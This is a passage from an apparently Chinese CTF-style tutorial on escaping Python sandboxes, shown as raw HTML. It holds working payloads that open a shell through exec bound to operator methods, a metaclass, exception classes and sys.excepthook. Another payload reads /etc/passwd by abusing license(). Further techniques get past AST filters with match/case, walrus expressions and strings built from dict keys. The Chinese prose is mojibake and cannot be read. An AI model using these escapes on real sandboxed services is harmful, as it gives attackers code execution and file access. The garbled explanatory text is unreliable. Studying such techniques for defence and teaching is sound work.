class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__sub__ (k - <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mul__ (k * <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__floordiv__ (k // <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__truediv__ (k / <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mod__ (k % <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__pow__ (k**<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__lt__ (k &lt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__le__ (k &lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__eq__ (k == <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ne__ (k != <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ge__ (k &gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__gt__ (k &gt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iadd__ (k += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__isub__ (k -= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__imul__ (k *= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ifloordiv__ (k //= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__idiv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__itruediv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>) (Note that this only works when <span class="keyword">from</span> __future__ <span class="keyword">import</span> division <span class="keyword">is</span> <span class="keyword">in</span> effect.)</span><br><span class="line">__imod__ (k %= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ipow__ (k **= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ilshift__ (k&lt;&lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__irshift__ (k &gt;&gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iand__ (k = <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ior__ (k |= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ixor__ (k ^= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>ç¤ºä¾‹:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __sub__ = <span class="built_in">exec</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub-<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure></div><h6 id="exceptions-åˆ©ç”¨"><a class="markdownIt-Anchor" href="#exceptions-åˆ©ç”¨">#</a> exceptions åˆ©ç”¨</h6><p>åˆ©ç”¨ exceptions çš„ç›®çš„ä¹Ÿæ˜¯ä¸ºäº†ç»•è¿‡æ˜¾ç¤ºåœ°å®ä¾‹åŒ–ä¸€ä¸ªç±»ï¼Œå¦‚æœä¸€ä¸ªç±»ç»§æ‰¿äº† Exception ç±»ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ raise å…³é”®å­—æ¥å®ä¾‹åŒ–. payload å¦‚ä¸‹:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">raise</span> RCE </span><br></pre></td></tr></table></figure></div><p>raise ä¼šè¿›å…¥ RCE çš„  <code>__init__</code> , ç„¶åè§¦å‘  <code>__iadd__</code>  ä¹Ÿå°±æ˜¯ exec.</p><p>å½“ç„¶ï¼Œè§¦å‘å¼‚å¸¸ä¸ä¸€å®šéœ€è¦ raise, ä¸»åŠ¨åœ°ç¼–å†™é”™è¯¯ä»£ç ä¹Ÿå¯ä»¥è§¦å‘ï¼Œä¸æ˜¯å°±æœ‰äº†å¦‚ä¸‹çš„å‡ ç§ payload.</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c</span>):</span><br><span class="line">        self += <span class="string">&quot;os.system(&#x27;sh&#x27;)&quot;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span></span><br><span class="line">sys.excepthook = X</span><br><span class="line"><span class="number">1</span>/<span class="number">0</span></span><br></pre></td></tr></table></figure></div><p>è¿™ä¸ª payload ä¸­ç›´æ¥å°† sys.excepthook è¿›è¡Œè¦†ç›–ï¼Œä»»ä½•å¼‚å¸¸äº§ç”Ÿæ—¶éƒ½ä¼šè§¦å‘.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>():</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d, e</span>):</span><br><span class="line">    self += <span class="string">&quot;print(open(&#x27;flag&#x27;).read())&quot;</span></span><br><span class="line">  __iadd__ = <span class="built_in">eval</span></span><br><span class="line">__builtins__.<span class="built_in">__import__</span> = X</span><br><span class="line">&#123;&#125;[<span class="number">1337</span>]</span><br></pre></td></tr></table></figure></div><p>è¿™ä¸ª payload å°†  <code>__import__</code>  å‡½æ•°è¿›è¡Œè¦†ç›–ï¼Œæœ€åçš„ {}[1337] åœ¨æ­£å¸¸æƒ…å†µä¸‹ä¼šå¼•å‘ KeyError å¼‚å¸¸ï¼Œå› ä¸º Python åœ¨å¼•å‘å¼‚å¸¸æ—¶ä¼šå°è¯•å¯¼å…¥æŸäº›æ¨¡å—ï¼ˆæ¯”å¦‚ traceback æ¨¡å—ï¼‰ï¼Œå¯¼å…¥æ—¶å°±ä¼šè§¦å‘  <code>__import__</code> .</p><h5 id="é€šè¿‡-license-å‡½æ•°è¯»å–æ–‡ä»¶"><a class="markdownIt-Anchor" href="#é€šè¿‡-license-å‡½æ•°è¯»å–æ–‡ä»¶">#</a> é€šè¿‡ license å‡½æ•°è¯»å–æ–‡ä»¶</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> self, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><p>ä¸Šé¢çš„ payload ä¿®æ”¹å†…å»ºå‡½æ•° license çš„æ–‡ä»¶ååˆ—è¡¨ä¸º /etc/passwd å½“è°ƒç”¨  <code>license()</code>  æ—¶ä¼šæ‰“å°è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹.</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames</span><br><span class="line">[<span class="string">&#x27;/usr/lib/python3.11/../LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/../LICENSE&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/LICENSE&#x27;</span>, <span class="string">&#x27;./LICENSE.txt&#x27;</span>, <span class="string">&#x27;./LICENSE&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>payload ä¸­å°† help ç±»çš„  <code>__enter__</code>  æ–¹æ³•è¦†ç›–ä¸º  <code>license</code>  æ–¹æ³•ï¼Œè€Œ  <code>with</code>  è¯­å¥åœ¨åˆ›å»ºä¸Šä¸‹æ–‡æ—¶ä¼šè°ƒç”¨ help çš„ <code>__enter__</code> , ä»è€Œæ‰§è¡Œ  <code>license</code>  æ–¹æ³•ã€‚è¿™é‡Œçš„ help ç±»åªæ˜¯ä¸€ä¸ªè½½ä½“ï¼Œæ›¿æ¢ä¸ºå…¶ä»–çš„æ”¯æŒä¸Šä¸‹æ–‡çš„ç±»æˆ–è€…è‡ªå®šä¹‰ä¸€ä¸ªç±»ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ä¾‹å¦‚:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyContext</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = MyContext()</span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> self, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><h4 id="ç»•è¿‡-astattribute-è·å–å±æ€§"><a class="markdownIt-Anchor" href="#ç»•è¿‡-astattribute-è·å–å±æ€§">#</a> ç»•è¿‡ ast.Attribute è·å–å±æ€§</h4><p>å¦‚ä½•ç»•è¿‡ ast.Attributeï¼Ÿpython 3.10 ä¸­å¼•å…¥äº†ä¸€ä¸ªæ–°çš„ç‰¹æ€§ï¼šmatch/caseï¼Œç±»ä¼¼å…¶ä»–è¯­è¨€ä¸­çš„ switch/caseï¼Œä½† match/case æ›´åŠ å¼ºå¤§ï¼Œé™¤äº†å¯ä»¥åŒ¹é…æ•°å­—å­—ç¬¦ä¸²ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åŒ¹é…å­—å…¸ã€å¯¹è±¡ç­‰ã€‚</p><p>æœ€ç®€å•çš„ç¤ºä¾‹ï¼ŒåŒ¹é…å­—ç¬¦ä¸²ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">item = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;One&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Two&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Two</span></span><br></pre></td></tr></table></figure></div><p>è¿˜å¯ä»¥åŒ¹é…å¹¶è‡ªåŠ¨èµ‹å€¼ç»™å±€éƒ¨å˜é‡ï¼Œä¼ å…¥ (1,2) æ—¶ï¼Œä¼šè¿›å…¥ç¬¬äºŒä¸ªåˆ†æ”¯ï¼Œå¹¶å¯¹ x,y èµ‹å€¼ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">item = (<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> (x, y, z):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span> <span class="subst">&#123;y&#125;</span> <span class="subst">&#123;z&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> (x, y):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span> <span class="subst">&#123;y&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> (x,):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>å¯¹äºåŸºæœ¬ç±»å‹çš„åŒ¹é…æ¯”è¾ƒå¥½ç†è§£ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªåŒ¹é…ç±»çš„ç¤ºä¾‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.thing = value</span><br><span class="line"></span><br><span class="line">item = AClass(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> AClass(thing=x):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Got <span class="subst">&#123;x = &#125;</span>!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Got x = 32!</span></span><br></pre></td></tr></table></figure></div><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé‡ç‚¹å…³æ³¨ <code>case AClass(thing=x)</code> ï¼Œè¿™é‡Œçš„å«ä¹‰å¹¶éæ˜¯å°† x èµ‹å€¼ç»™ thingï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ç†è§£ä¸ºä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¡¨ç¤ºåŒ¹é…ç±»å‹ä¸º AClass ä¸”å­˜åœ¨ thing å±æ€§çš„å¯¹è±¡ï¼Œå¹¶ä¸” <strong>thing å±æ€§å€¼è‡ªåŠ¨èµ‹å€¼ç»™ xã€‚</strong></p><p>è¿™æ ·ä¸€æ¥å°±å¯ä»¥åœ¨ä¸é€‚ç”¨ã€‚å·çš„æƒ…å†µä¸‹è·å–åˆ°ç±»çš„å±æ€§å€¼ã€‚ä¾‹å¦‚è·å–  <code>''.__class__</code> ï¼Œå¯ä»¥ç¼–å†™å¦‚ä¸‹çš„ match/case è¯­å¥ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">str</span>(__class__=x):</span><br><span class="line">        <span class="built_in">print</span>(x==<span class="string">&#x27;&#x27;</span>.__class__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ° x å°±æ˜¯  <code>''.__class__</code> . å› ä¸ºæ‰€æœ‰çš„ç±»éƒ½è¾“å…¥ object ç±»ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ object æ¥æ›¿ä»£ strï¼Œè¿™æ ·å°±æ— éœ€å…³æ³¨åŒ¹é…åˆ°çš„åˆ°åº•æ˜¯å“ªä¸ªç±»ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">object</span>(__class__=x):</span><br><span class="line">        <span class="built_in">print</span>(x==<span class="string">&#x27;&#x27;</span>.__class__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure></div><p>å†æµ‹è¯•ä¸€ä¸‹è¯¥ payload çš„ ASTï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ast </span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">match str():</span></span><br><span class="line"><span class="string">    case str(__class__=x):</span></span><br><span class="line"><span class="string">        print(x)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(ast.dump(ast.parse(a, mode=<span class="string">&#x27;exec&#x27;</span>), indent=<span class="number">4</span>))</span><br></pre></td></tr></table></figure></div><p>AST å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Module(</span><br><span class="line">    body=[</span><br><span class="line">        Match(</span><br><span class="line">            subject=Call(</span><br><span class="line">                func=Name(<span class="built_in">id</span>=<span class="string">&#x27;str&#x27;</span>, ctx=Load()),</span><br><span class="line">                args=[],</span><br><span class="line">                keywords=[]),</span><br><span class="line">            cases=[</span><br><span class="line">                match_case(</span><br><span class="line">                    pattern=MatchClass(</span><br><span class="line">                        cls=Name(<span class="built_in">id</span>=<span class="string">&#x27;str&#x27;</span>, ctx=Load()),</span><br><span class="line">                        patterns=[],</span><br><span class="line">                        kwd_attrs=[</span><br><span class="line">                            <span class="string">&#x27;__class__&#x27;</span>],</span><br><span class="line">                        kwd_patterns=[</span><br><span class="line">                            MatchAs(name=<span class="string">&#x27;x&#x27;</span>)]),</span><br><span class="line">                    body=[</span><br><span class="line">                        Expr(</span><br><span class="line">                            value=Call(</span><br><span class="line">                                func=Name(<span class="built_in">id</span>=<span class="string">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class="line">                                args=[</span><br><span class="line">                                    Name(<span class="built_in">id</span>=<span class="string">&#x27;x&#x27;</span>, ctx=Load())],</span><br><span class="line">                                keywords=[]))])])],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ°ç¡®å®æ²¡æœ‰ Attributeï¼Œä¾æ®è¿™ä¸ªåŸç†ï¼Œå°±å¯ä»¥ç»•è¿‡ ast.Attribute</p><p>æˆ‘ä»¬å¯ä»¥æ„é€ æ›¿ä»£  <code>''.__class__.__base__.__subclasses__()</code>  çš„ payloadï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">match str():</span><br><span class="line">    case object(__class__=clazz):</span><br><span class="line">        match clazz:</span><br><span class="line">            case object(__base__=bass):</span><br><span class="line">                match bass:</span><br><span class="line">                    case object(__subclasses__=subclazz):</span><br><span class="line">                        print(subclazz)</span><br></pre></td></tr></table></figure></div><h4 id="ç»•è¿‡-astassign-èµ‹å€¼å˜é‡"><a class="markdownIt-Anchor" href="#ç»•è¿‡-astassign-èµ‹å€¼å˜é‡">#</a> ç»•è¿‡ ast.Assign èµ‹å€¼å˜é‡</h4><p>ast.Assign æ— æ³•ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨ = æ¥è¿›è¡Œèµ‹å€¼ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨æµ·è±¡è¡¨è¾¾å¼:= è¿›è¡Œç»•è¿‡ã€‚ä¾‹å¦‚ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    system:=<span class="number">111</span>,</span><br><span class="line">    bash:=<span class="number">222</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><p>æ­¤æ—¶ AST æ ‘å¦‚ä¸‹ï¼Œæµ·è±¡è¡¨è¾¾å¼ç”¨åˆ°çš„æ˜¯ ast.NamedExpr è€Œé ast.Assign</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Module(</span><br><span class="line">    body=[</span><br><span class="line">        Expr(</span><br><span class="line">            value=<span class="type">List</span>(</span><br><span class="line">                elts=[</span><br><span class="line">                    NamedExpr(</span><br><span class="line">                        target=Name(<span class="built_in">id</span>=<span class="string">&#x27;system&#x27;</span>, ctx=Store()),</span><br><span class="line">                        value=Constant(value=<span class="number">111</span>)),</span><br><span class="line">                    NamedExpr(</span><br><span class="line">                        target=Name(<span class="built_in">id</span>=<span class="string">&#x27;bash&#x27;</span>, ctx=Store()),</span><br><span class="line">                        value=Constant(value=<span class="number">222</span>))],</span><br><span class="line">                ctx=Load()))],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure></div><h4 id="ç»•è¿‡-astconstant-è·å–æ•°å­—-å­—ç¬¦ä¸²"><a class="markdownIt-Anchor" href="#ç»•è¿‡-astconstant-è·å–æ•°å­—-å­—ç¬¦ä¸²">#</a> ç»•è¿‡ ast.Constant è·å–æ•°å­—ã€å­—ç¬¦ä¸²</h4><p>é¢˜ç›®é™åˆ¶äº† ast.Constantï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ä½¿ç”¨æ•°å­—ã€å­—ç¬¦ä¸²å¸¸é‡ï¼Œä½†é€šè¿‡å…¶ä»–çš„å‡½æ•°ç»„åˆå¯ä»¥æ„é€ å‡ºæ•°å­—å’Œå­—ç¬¦ä¸²ã€‚ ä¾‹å¦‚ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span> : <span class="built_in">str</span>()</span><br><span class="line"><span class="number">0</span>  : <span class="built_in">len</span>([])</span><br><span class="line"><span class="string">&quot;0&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([]))</span><br><span class="line"><span class="string">&quot;1&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">str</span>()])) æˆ– <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">min</span>]))</span><br><span class="line"><span class="string">&quot;2&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">str</span>(),<span class="built_in">str</span>()])) æˆ– <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">max</span>]))</span><br><span class="line"><span class="string">&#x27;A&#x27;</span>: <span class="built_in">chr</span>(<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>])*<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>]))</span><br></pre></td></tr></table></figure></div><p>å¦‚æœè¦ç”¨æ•°å­—æ¥æ„é€ å­—ç¬¦ä¸²ï¼Œé€šå¸¸éœ€è¦ç”¨åˆ° chr å‡½æ•°ï¼Œè™½ç„¶é¢˜ç›®çš„ builtins æ²¡æœ‰ç›´æ¥æä¾› chr å‡½æ•°ï¼Œä½†ä¹Ÿå¯ä»¥è‡ªå·±æ‰‹åŠ¨å®ç°ä¸€ä¸ª chrã€‚</p><p>å½“ç„¶ï¼Œé¢˜ç›® builtins å…è®¸ dict å’Œ listï¼Œå› æ­¤å¯ä»¥ç›´æ¥ç”¨è¿™ä¸¤ä¸ªå‡½æ•°ç›´æ¥æ„é€ å‡ºå­—ç¬¦ä¸²</p><p>åœ¨è¿™ä¸ª payload ä¸­ï¼Œéœ€è¦æ„é€ å‡º _wrap_closeã€systemã€bash</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;bash&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼è·å–åˆ°è¿™å‡ ä¸ªå­—ç¬¦ä¸²ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(system=[]))[<span class="number">0</span>]            <span class="comment"># system</span></span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[]))[<span class="number">0</span>]       <span class="comment"># _wrap_close</span></span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(bash=[]))[<span 